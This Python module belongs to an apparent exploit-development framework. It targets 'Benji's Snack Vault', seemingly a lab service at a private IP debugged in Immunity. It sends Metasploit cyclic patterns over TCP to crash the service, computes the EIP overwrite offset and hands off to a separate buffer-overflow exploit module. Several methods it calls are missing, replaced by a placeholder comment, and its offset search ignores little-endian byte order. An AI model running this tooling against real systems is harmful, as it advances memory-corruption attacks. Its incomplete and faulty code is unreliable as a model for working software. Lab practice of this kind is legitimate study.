#!/usr/bin/env python3
import socket
import time
import subprocess
from base_module import BaseModule
from utils import colored

class BenjisSnackVaultFuzz(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "benjis_snack_vault_fuzz"
        self.description = "Fuzzer and pattern tool for Benji's Snack Vault"

        self.options = {
            "RHOST": {"value": "192.168.107.132", "required": True, "description": "Target IP"},
            "RPORT": {"value": 9999, "required": True, "description": "Target port"},
            "PREFIX": {"value": "MEOW ", "required": True, "description": "Command prefix"},
            "MODE": {"value": "fuzz", "required": True, "description": "Mode: fuzz | pattern | pattern_and_offset | badchars | test_offset"},
            "PATTERN_LENGTH": {"value": 3000, "required": False, "description": "Pattern length"},
            "OFFSET": {"value": 0, "required": False, "description": "Offset to EIP (auto-set)"},
            "CRLF": {"value": True, "required": False, "description": "Append \\r\\n"}
        }

    def show_help(self):
        print(colored("\nRecommended workflow:", "yellow"))
        print("  set MODE pattern_and_offset → run → enter EIP from Immunity")
        print("  → Offset is automatically calculated and set for you")

    def run(self):
        opts = {k: v["value"] for k, v in self.options.items()}
        rhost = opts["RHOST"]
        rport = int(opts["RPORT"])
        prefix = opts["PREFIX"]
        mode = opts["MODE"].lower()
        crlf = opts["CRLF"]

        if mode == "fuzz":
            self._run_fuzz(rhost, rport, prefix, crlf)
        elif mode == "pattern":
            self._run_pattern(rhost, rport, prefix, int(opts["PATTERN_LENGTH"]), crlf)
        elif mode == "pattern_and_offset":
            self._run_pattern_and_offset(rhost, rport, prefix, int(opts["PATTERN_LENGTH"]), crlf)
        elif mode == "badchars":
            if opts["OFFSET"] == 0:
                print(colored("[-] Run pattern_and_offset first to set OFFSET", "red"))
                return
            self._run_badchars(rhost, rport, prefix, int(opts["OFFSET"]), crlf)
        elif mode == "test_offset":
            if opts["OFFSET"] == 0:
                print(colored("[-] Set OFFSET first", "red"))
                return
            self._test_offset(rhost, rport, prefix, int(opts["OFFSET"]), crlf)
        else:
            print(colored(f"[-] Unknown mode: {mode}", "red"))

    def _send_payload(self, rhost, rport, payload):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((rhost, rport))
            s.send(payload)
            s.close()
            return True
        except Exception as e:
            print(colored(f"[!] Connection failed: {e}", "red"))
            return False

    def _run_pattern_and_offset(self, rhost, rport, prefix, length, crlf):
        print(colored(f"[*] Sending {length}-byte pattern...", "yellow"))
        try:
            pattern = subprocess.check_output(
                ["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(length)],
                text=True
            ).strip().encode()
        except Exception as e:
            print(colored(f"[-] Failed to generate pattern: {e}", "red"))
            return

        payload = prefix.encode() + pattern + (b"\r\n" if crlf else b"")
        if self._send_payload(rhost, rport, payload):
            print(colored("[+] Pattern sent. App crashed in Immunity.", "green"))
            print(colored("    Copy the EIP value from Immunity NOW (8 hex digits)", "yellow"))
            eip_hex = input(colored("Enter EIP from Immunity: ", "yellow")).strip().upper()

            offset = self._calc_offset(eip_hex, length)
            if offset is not None:
                self.options["OFFSET"]["value"] = offset
                print(colored(f"[+] OFFSET auto-set to {offset}!", "green"))
                print(colored("    Switch to benjis_snack_vault_bo and run the exploit", "yellow"))
        else:
            print(colored("[!] Send failed - re-launch the exe", "red"))

    def _calc_offset(self, eip_hex, length):
        try:
            eip_bytes = bytes.fromhex(eip_hex)
            pattern_output = subprocess.check_output(
                ["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(length)],
                text=True
            ).strip()
            pattern = pattern_output.encode()
            offset = pattern.find(eip_bytes)
            if offset == -1:
                print(colored("[-] EIP not found. Make sure you used the EIP from this exact run.", "red"))
                return None
            print(colored(f"[+] Exact match at offset {offset}", "green"))
            return offset
        except Exception as e:
            print(colored(f"[-] Calculation failed: {e}", "red"))
            return None

    # Keep your existing _run_fuzz, _run_pattern, _run_badchars, _test_offset methods here...

    def handle_command(self, cmd):
        if cmd.strip().lower() == "run":
            self.run()
            return
        super().handle_command(cmd)